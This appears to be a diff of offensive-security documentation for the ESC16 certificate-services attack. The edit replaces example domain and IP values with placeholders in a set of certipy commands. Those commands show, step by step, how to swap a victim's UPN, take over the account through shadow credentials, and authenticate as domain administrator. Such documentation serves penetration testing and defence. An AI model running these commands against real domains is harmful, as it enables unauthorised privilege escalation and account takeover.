@@ -145,30 +145,30 @@ If we are an attacker with `GenericWrite` permissions over the `victim` account,
 
 #### ESC16 Exploitation
 
-1. **Read UPN of the Victim Account**
+1. **Read UPN of the Victim Account** (Reference for step 5) 
 
     ```bash
     certipy account \
-        -u 'attacker@corp.local' -p 'Passw0rd!' \
-        -dc-ip '10.0.0.100' -user 'victim' \
+        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
+        -dc-ip '<DC-IP>' -user 'victim' \
         read
     ```
 
-2. **Update UPN of the Victim Account**
+2. **Update UPN of the Victim Account:** Update the `UPN` of the victim account to a value that we control, such as `administrator`.
 
     ```bash
     certipy account \
-        -u 'attacker@corp.local' -p 'Passw0rd!' \
-        -dc-ip '10.0.0.100' -upn 'administrator' \
+        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
+        -dc-ip '<DC-IP>' -upn 'administrator' \
         -user 'victim' update
     ```
 
-3. **Obtain credentials for the Victim Account (Can be skipped if already known)**
+3. **Obtain credentials for the Victim Account:** (Can be skipped if already known)
 
     ```bash
     certipy shadow \
-        -u 'attacker@corp.local' -p 'Passw0rd!' \
-        -dc-ip '10.0.0.100' -account 'victim' \
+        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
+        -dc-ip '<DC-IP>' -account 'victim' \
         auto
     ```
 
@@ -184,8 +184,8 @@ If we are an attacker with `GenericWrite` permissions over the `victim` account,
 
         ```bash
         certipy req \
-            -k -dc-ip '10.0.0.100' \
-            -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
+            -k -dc-ip '<DC-IP>' \
+            -target 'CA.<DOMAIN>' -ca 'CORP-CA' \
             -template 'User'
         ```
 
@@ -193,8 +193,8 @@ If we are an attacker with `GenericWrite` permissions over the `victim` account,
 
     ```bash
     certipy account \
-        -u 'attacker@corp.local' -p 'Passw0rd!' \
-        -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
+        -u 'attacker@<DOMAIN>' -p 'Passw0rd!' \
+        -dc-ip '<DC-IP>' -upn 'victim@<DOMAIN>' \
         -user 'victim' update
     ```
 
@@ -202,8 +202,8 @@ If we are an attacker with `GenericWrite` permissions over the `victim` account,
 
     ```bash
     certipy auth \
-        -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-        -username 'administrator' -domain 'corp.local'
+        -dc-ip '<DC-IP>' -pfx 'administrator.pfx' \
+        -username 'administrator' -domain '<DOMAIN>'
     ```
 
 ## References
